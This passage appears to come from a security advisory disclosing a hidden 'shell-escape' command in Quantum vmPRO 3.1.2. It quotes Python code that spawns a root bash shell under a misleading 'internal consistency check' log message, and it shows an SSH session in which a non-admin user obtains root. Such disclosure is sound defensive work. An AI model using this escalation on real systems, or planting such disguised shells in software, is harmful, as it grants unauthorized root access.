----------
 
[ 0x01 - Shell Backdoor Command ]
 
The file "/usr/local/pancetera/bin/cmd_processor.py" on the vmPRO 3.1.2
virtual machine contains the following lines:
 
    def cmd_shell_escape(self, args):
        log_panshell(syslog.LOG_INFO, "internal consistency check started")
        env = dict(os.environ)
        env[&#039;SHELL&#039;] = &#039;/bin/bash&#039;
        env[&#039;HOME&#039;]  = &#039;/tmp&#039;
        env[&#039;TERM&#039;]  = &#039;xterm&#039;
        os.spawnle(os.P_WAIT, &#039;/bin/bash&#039;, &#039;bash&#039;, env)
        log_panshell(syslog.LOG_INFO, "internal consistency check finished")
        return
 
This is a hidden command to gain a root shell. If we create a user in the
web interface without administrator rights,
we can still ssh and gain a root shell! This of course should not be
possible and only be accessible to an admin user.
 
$ ssh non-admin@192.168.2.112
non-admin@192.168.2.112&#039;s password:
Last login: Thu Dec 19 23:42:10 2013 from 192.168.2.72
Welcome to Quantum vmPRO Console
--------------------------------
 
Quantum vmPRO GUI: https://192.168.2.112/
 
*** Type &#039;help&#039; for a list of commands.
 
quantum:localhost> shell-escape
bash-4.1# id
uid=0(root) gid=100(users) groups=0(root),100(users)

